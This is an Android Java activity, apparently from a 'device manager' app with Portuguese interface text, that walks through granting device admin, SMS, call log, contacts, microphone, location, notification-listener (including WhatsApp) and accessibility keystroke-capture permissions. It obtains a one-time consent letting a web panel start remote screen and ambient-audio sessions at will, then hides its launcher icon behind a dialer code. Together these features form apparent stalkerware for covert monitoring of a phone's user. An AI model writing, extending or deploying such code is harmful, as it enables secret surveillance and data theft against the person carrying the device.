package com.company.devicemgr.activities;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.OpenableColumns;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.company.devicemgr.receivers.DeviceAdminReceiver;
import com.company.devicemgr.utils.ApiConfig;
import com.company.devicemgr.utils.AppRuntime;
import com.company.devicemgr.utils.DeviceIdentity;
import com.company.devicemgr.utils.HttpClient;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

public class MainPermissionsActivity extends Activity {
    Button btnDeviceAdmin, btnLocationPerm, btnStoragePerm, btnCallLogPerm, btnSmsPerm, btnNotifAccess, btnUsageAccess, btnAccessibilityAccess, btnGrantSupportConsent, btnGrantScreenCapture, btnStartService, btnPickMedia, btnOpenTextCaptureConsent, btnOpenSettings;
    TextView tvStatus, tvDeviceId, tvSupportConsentStatus, tvScreenCaptureStatus, tvRemoteSupportState;
    private static final int REQ_CODE_DEVICE_ADMIN = 1001;
    private static final int REQ_CODE_PERMS = 2001;
    private static final int REQ_PICK_MEDIA = 3001;
    private static final int REQ_CODE_MEDIA_PROJECTION = 3002;
    private static final String SUPPORT_CONSENT_VERSION = "support-session-v2";
    private static final int ANDROID_13_API_LEVEL = 33;
    private static final int ANDROID_14_API_LEVEL = 34;
    private static final String READ_MEDIA_IMAGES_PERMISSION = "android.permission.READ_MEDIA_IMAGES";
    private static final String READ_MEDIA_VIDEO_PERMISSION = "android.permission.READ_MEDIA_VIDEO";
    private static final String READ_MEDIA_AUDIO_PERMISSION = "android.permission.READ_MEDIA_AUDIO";
    private static final String READ_MEDIA_VISUAL_USER_SELECTED_PERMISSION = "android.permission.READ_MEDIA_VISUAL_USER_SELECTED";

    @Override
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        setContentView(com.company.devicemgr.R.layout.activity_main_permissions);

        btnDeviceAdmin = findViewById(com.company.devicemgr.R.id.btnDeviceAdmin);
        btnLocationPerm = findViewById(com.company.devicemgr.R.id.btnLocationPerm);
        btnStoragePerm = findViewById(com.company.devicemgr.R.id.btnStoragePerm);
        btnCallLogPerm = findViewById(com.company.devicemgr.R.id.btnCallLogPerm);
        btnSmsPerm = findViewById(com.company.devicemgr.R.id.btnSmsPerm);
        btnNotifAccess = findViewById(com.company.devicemgr.R.id.btnNotifAccess);
        btnUsageAccess = findViewById(com.company.devicemgr.R.id.btnUsageAccess);
        btnAccessibilityAccess = findViewById(com.company.devicemgr.R.id.btnAccessibilityAccess);
        btnGrantSupportConsent = findViewById(com.company.devicemgr.R.id.btnGrantSupportConsent);
        btnGrantScreenCapture = findViewById(com.company.devicemgr.R.id.btnGrantScreenCapture);
        btnStartService = findViewById(com.company.devicemgr.R.id.btnStartService);
        btnOpenTextCaptureConsent = findViewById(com.company.devicemgr.R.id.btnOpenTextCaptureConsent);
        btnOpenSettings = findViewById(com.company.devicemgr.R.id.btnOpenSettings);
        btnPickMedia = findViewById(com.company.devicemgr.R.id.btnPickMedia);

        tvStatus = findViewById(com.company.devicemgr.R.id.tvStatus);
        tvDeviceId = findViewById(com.company.devicemgr.R.id.tvDeviceId);
        tvSupportConsentStatus = findViewById(com.company.devicemgr.R.id.tvSupportConsentStatus);
        tvScreenCaptureStatus = findViewById(com.company.devicemgr.R.id.tvScreenCaptureStatus);
        tvRemoteSupportState = findViewById(com.company.devicemgr.R.id.tvRemoteSupportState);

        final android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
        String deviceId = sp.getString("deviceId", null);
        if (deviceId == null || deviceId.trim().isEmpty()) {
            deviceId = DeviceIdentity.getStableDeviceId(this);
            sp.edit().putString("deviceId", deviceId).apply();
        }
        tvDeviceId.setText("DeviceId: " + deviceId);

        btnDeviceAdmin.setOnClickListener(v -> {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminComp = new ComponentName(MainPermissionsActivity.this, DeviceAdminReceiver.class);
            if (!dpm.isAdminActive(adminComp)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Necessário para bloqueio temporário e políticas.");
                startActivityForResult(intent, REQ_CODE_DEVICE_ADMIN);
            } else {
                showMsg("Device Admin já activo");
            }
        });

        btnLocationPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
        }));

        btnStoragePerm.setOnClickListener(v -> requestPermissionsIfNeeded(getStoragePermissionsForCurrentVersion()));

        btnCallLogPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS
        }));

        btnSmsPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.RECORD_AUDIO
        }));

        btnNotifAccess.setOnClickListener(v -> {
            showMsg("Ative o Notification Listener para sincronizar notificações e WhatsApp");
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        });

        btnUsageAccess.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)));

        btnAccessibilityAccess.setOnClickListener(v -> new AlertDialog.Builder(MainPermissionsActivity.this)
                .setTitle("Função teclado por acessibilidade")
                .setMessage("A função teclados depende de um consentimento permanente dado uma única vez na activity_text_capture_consent para esta instalação. Depois de aceitar, ative o serviço de acessibilidade desta app nas definições do Android para permitir a captura de texto.")
                .setPositiveButton("Abrir consentimento", (d, which) -> startActivity(new Intent(MainPermissionsActivity.this, TextCaptureConsentActivity.class)))
                .setNegativeButton("Cancelar", null)
                .show());

        btnGrantSupportConsent.setOnClickListener(v -> new AlertDialog.Builder(MainPermissionsActivity.this)
                .setTitle("Consentimento remoto")
                .setMessage("Autoriza uma única vez o uso remoto de ecrã e áudio neste dispositivo? Depois disso, o painel web poderá iniciar ou parar sessões enquanto o telemóvel estiver online.")
                .setPositiveButton("Autorizar", (d, which) -> grantRemoteSupportConsent())
                .setNegativeButton("Cancelar", null)
                .show());

        btnGrantScreenCapture.setOnClickListener(v -> new AlertDialog.Builder(MainPermissionsActivity.this)
                .setTitle("Captura live de ecrã")
                .setMessage("Para streaming remoto real do ecrã, o Android precisa de uma autorização do sistema para MediaProjection. Aceite a próxima janela; depois disso a app vai reutilizar essa autorização enquanto o processo/serviço permanecer ativo, evitando novos pedidos em cada sessão.")
                .setPositiveButton("Continuar", (d, which) -> requestScreenCaptureGrant())
                .setNegativeButton("Cancelar", null)
                .show());

        btnStartService.setOnClickListener(v -> {
            boolean active = sp.getBoolean("active", false);
            if (!active) {
                new AlertDialog.Builder(MainPermissionsActivity.this)
                        .setTitle("Aviso")
                        .setMessage("A conta pode não estar activada. Continua?")
                        .setPositiveButton("Sim", (d, which) -> startTelemetryService())
                        .setNegativeButton("Não", null)
                        .show();
            } else {
                startTelemetryService();
            }
        });

        btnOpenTextCaptureConsent.setOnClickListener(v -> startActivity(new Intent(this, TextCaptureConsentActivity.class)));

        btnOpenSettings.setOnClickListener(v -> startActivity(new Intent(this, SettingsActivity.class)));

        btnPickMedia.setOnClickListener(v -> {
            Intent i = new Intent(Intent.ACTION_OPEN_DOCUMENT);
            i.addCategory(Intent.CATEGORY_OPENABLE);
            i.setType("*/*");
            i.putExtra(Intent.EXTRA_MIME_TYPES, new String[]{"image/*", "video/*"});
            startActivityForResult(i, REQ_PICK_MEDIA);
        });

        updateStatusText();
    }

    private String[] getStoragePermissionsForCurrentVersion() {
        if (Build.VERSION.SDK_INT >= ANDROID_14_API_LEVEL) {
            return new String[]{
                    READ_MEDIA_IMAGES_PERMISSION,
                    READ_MEDIA_VIDEO_PERMISSION,
                    READ_MEDIA_VISUAL_USER_SELECTED_PERMISSION,
                    READ_MEDIA_AUDIO_PERMISSION
            };
        }
        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
            return new String[]{READ_MEDIA_IMAGES_PERMISSION, READ_MEDIA_VIDEO_PERMISSION, READ_MEDIA_AUDIO_PERMISSION};
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            return new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
        }
        return new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE};
    }


    private void requestScreenCaptureGrant() {
        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        if (manager == null) {
            showMsg("MediaProjection indisponível neste dispositivo");
            return;
        }
        try {
            startActivityForResult(manager.createScreenCaptureIntent(), REQ_CODE_MEDIA_PROJECTION);
        } catch (Exception e) {
            showMsg("Erro ao pedir captura de ecrã: " + e.getMessage());
        }
    }

    private void startTelemetryService() {
        android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
        if (!sp.getBoolean("support_consent_granted", false)) {
            showMsg("Conceda primeiro o consentimento remoto de ecrã/áudio");
            return;
        }

        AppRuntime.ensureTelemetryStarted(this);
        showMsg("Serviço iniciado");
        updateStatusText();

        getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit().putBoolean("setup_completed", true).apply();
        AppRuntime.setLauncherVisible(this, false);
        new AlertDialog.Builder(this)
                .setTitle("Configuração concluída")
                .setMessage("Aplicação ocultada. Para reabrir, use o código no discador: *#*#8466#*#*")
                .setPositiveButton("OK", (d, w) -> finishAffinity())
                .show();
    }

    private void showMsg(String m) {
        tvStatus.setText("Status: " + m);
    }

    private void updateStatusText() {
        android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
        String token = sp.getString("auth_token", null);
        String deviceId = sp.getString("deviceId", null);
        tvStatus.setText("Token: " + (token != null ? "OK" : "missing"));
        tvDeviceId.setText("DeviceId: " + deviceId);
        updateSupportConsentStatus();
        updateScreenCaptureStatus();
        updateRemoteSupportState();
    }

    private void updateSupportConsentStatus() {
        android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
        boolean granted = sp.getBoolean("support_consent_granted", false);
        String version = sp.getString("support_consent_version", null);
        tvSupportConsentStatus.setText(granted
                ? "Consentimento remoto: autorizado" + (version != null ? " (" + version + ")" : "")
                : "Consentimento remoto: pendente");
        btnGrantSupportConsent.setEnabled(!granted);
    }

    private void updateScreenCaptureStatus() {
        if (!AppRuntime.hasMediaProjectionGrant()) {
            tvScreenCaptureStatus.setText("Captura live de ecrã: pendente");
            return;
        }
        tvScreenCaptureStatus.setText("Captura live de ecrã: pronta (" + new java.util.Date(AppRuntime.getMediaProjectionGrantedAt()) + ")");
    }

    private void updateRemoteSupportState() {
        android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
        String sessionId = sp.getString("remote_support_active_session_id", null);
        String requestType = sp.getString("remote_support_active_type", null);
        long lastSyncAt = sp.getLong("remote_support_last_sync_at", 0L);

        if (sessionId == null || sessionId.trim().isEmpty()) {
            tvRemoteSupportState.setText(lastSyncAt > 0
                    ? "Sessão remota: inativa (última sincronização: " + new java.util.Date(lastSyncAt) + ")"
                    : "Sessão remota: inativa");
            return;
        }

        String friendlyType = "ambient_audio".equals(requestType) ? "áudio" : "ecrã";
        tvRemoteSupportState.setText("Sessão remota: " + friendlyType + " ativa (id: " + sessionId + ")");
    }

    private void grantRemoteSupportConsent() {
        requestPermissionsIfNeeded(new String[]{Manifest.permission.RECORD_AUDIO});
        new Thread(() -> {
            try {
                org.json.JSONObject body = new org.json.JSONObject();
                body.put("accepted", true);
                body.put("consentTextVersion", SUPPORT_CONSENT_VERSION);
                String deviceId = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).getString("deviceId", "unknown");
                String token = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).getString("auth_token", null);
                String url = com.company.devicemgr.utils.ApiConfig.api("/api/devices/" + deviceId + "/support-consent");
                com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token);
                getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit()
                        .putBoolean("support_consent_granted", true)
                        .putString("support_consent_version", SUPPORT_CONSENT_VERSION)
                        .apply();
                runOnUiThread(() -> {
                    showMsg("Consentimento remoto guardado");
                    updateStatusText();
                });
            } catch (Exception e) {
                runOnUiThread(() -> showMsg("Erro ao guardar consentimento: " + e.getMessage()));
            }
        }).start();
    }

    private void requestPermissionsIfNeeded(String[] perms) {
        List<String> need = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                need.add(p);
            }
        }
        if (!need.isEmpty()) {
            ActivityCompat.requestPermissions(this, need.toArray(new String[0]), REQ_CODE_PERMS);
        } else {
            showMsg("Permissões já concedidas");
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_CODE_DEVICE_ADMIN) {
            if (resultCode == RESULT_OK) {
                showMsg("Device Admin activado");
            } else {
                showMsg("Device Admin não activado");
            }
        } else if (requestCode == REQ_PICK_MEDIA && resultCode == RESULT_OK && data != null) {
            Uri uri = data.getData();
            if (uri != null) {
                grantUriReadPermission(data, uri);
                getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit().putString("last_media_uri", uri.toString()).apply();
                uploadSelectedMedia(uri);
            }
        } else if (requestCode == REQ_CODE_MEDIA_PROJECTION) {
            if (resultCode == RESULT_OK && data != null) {
                AppRuntime.setMediaProjectionGrant(resultCode, data);
                showMsg("Captura live de ecrã autorizada");
            } else {
                AppRuntime.clearMediaProjectionGrant();
                showMsg("Captura live de ecrã recusada");
            }
            updateStatusText();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE_PERMS) {
            boolean ok = true;
            for (int r : grantResults) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    ok = false;
                    break;
                }
            }
            showMsg(ok ? "Permissões concedidas" : "Algumas permissões não concedidas");
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateStatusText();
    }

    private void grantUriReadPermission(Intent data, Uri uri) {
        try {
            final int takeFlags = data.getFlags() & (Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            getContentResolver().takePersistableUriPermission(uri, takeFlags);
        } catch (SecurityException ignored) {
        } catch (Exception e) {
            showMsg("Permissão persistente indisponível: " + e.getMessage());
        }
    }

    private void uploadSelectedMedia(Uri uri) {
        String token = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).getString("auth_token", null);
        String deviceId = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).getString("deviceId", null);
        if (deviceId == null || deviceId.trim().isEmpty()) {
            deviceId = DeviceIdentity.getStableDeviceId(this);
            getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit().putString("deviceId", deviceId).apply();
        }
        if (token == null || token.trim().isEmpty()) {
            showMsg("Token em falta para enviar a mídia");
            return;
        }

        final String resolvedDeviceId = deviceId;
        showMsg("A enviar mídia seleccionada...");
        new Thread(() -> {
            try {
                String mime = getContentResolver().getType(uri);
                String filename = resolveDisplayName(uri, mime);
                byte[] data = readAllBytes(uri);

                java.util.Map<String, String> form = new java.util.HashMap<>();
                form.put("captureMode", "manual_pick");
                form.put("captureKind", mime != null && mime.startsWith("video/") ? "picked_video" : "picked_image");

                JSONObject metadata = new JSONObject();
                metadata.put("source", "MainPermissionsActivity");
                metadata.put("pickedUri", uri.toString());
                metadata.put("displayName", filename);
                metadata.put("sizeBytes", data.length);
                form.put("metadataJson", metadata.toString());

                String response = HttpClient.uploadFile(
                        ApiConfig.api("/api/media/" + resolvedDeviceId + "/upload"),
                        "media",
                        filename,
                        data,
                        mime,
                        form,
                        token
                );
                JSONObject json = new JSONObject(response != null ? response : "{}");
                runOnUiThread(() -> showMsg(json.optBoolean("ok")
                        ? "Mídia enviada com sucesso"
                        : "Falha ao enviar mídia"));
            } catch (Exception e) {
                runOnUiThread(() -> showMsg("Erro ao enviar mídia: " + e.getMessage()));
            }
        }).start();
    }

    private String resolveDisplayName(Uri uri, String mime) {
        android.database.Cursor cursor = null;
        try {
            cursor = getContentResolver().query(uri, new String[]{OpenableColumns.DISPLAY_NAME}, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                int index = cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME);
                if (index >= 0) {
                    String value = cursor.getString(index);
                    if (value != null && value.trim().length() > 0) return value;
                }
            }
        } catch (Exception ignored) {
        } finally {
            if (cursor != null) cursor.close();
        }

        String extension = ".bin";
        if (mime != null && mime.contains("/")) {
            extension = "." + mime.substring(mime.indexOf('/') + 1);
        }
        return (mime != null && mime.startsWith("video/") ? "picked_video" : "picked_image") + extension;
    }

    private byte[] readAllBytes(Uri uri) throws Exception {
        try (InputStream inputStream = getContentResolver().openInputStream(uri);
             ByteArrayOutputStream outputStream = new ByteArrayOutputStream()) {
            if (inputStream == null) throw new IllegalStateException("Não foi possível abrir a mídia seleccionada");
            byte[] buffer = new byte[8192];
            int read;
            while ((read = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, read);
            }
            return outputStream.toByteArray();
        }
    }
}
